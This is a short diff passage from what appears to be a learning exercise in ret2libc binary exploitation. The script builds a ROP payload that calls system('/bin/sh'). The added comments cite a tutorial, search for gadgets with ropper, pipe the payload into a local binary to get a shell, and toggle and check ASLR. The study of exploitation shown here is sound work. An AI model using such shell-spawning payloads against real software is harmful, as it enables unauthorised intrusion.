@@ -42,12 +42,18 @@ payload = buffer + backup_base_pointer + rop_pop_rsi_ret + bin_sh_string + syste
 f = open("payload", "wb")
 f.write(payload)
 
+# https://sharkmoos.medium.com/binary-exploitation-exploiting-ret2libc-328eefb0421b
 # ropper --search 'pop rdi; ret;
 # cat payload - | ./bin
 # pwd
 # whoami
 # ps -p $$
 
-# now for aslr.
+# this was without ASLR:
+# cat /proc/sys/kernel/randomize_va_space
+# repeat 5 ldd ./bin | head -n1
+
+# now for ASLR:
 # echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
 # cat /proc/sys/kernel/randomize_va_space
+# repeat 5 ldd ./bin | head -n1
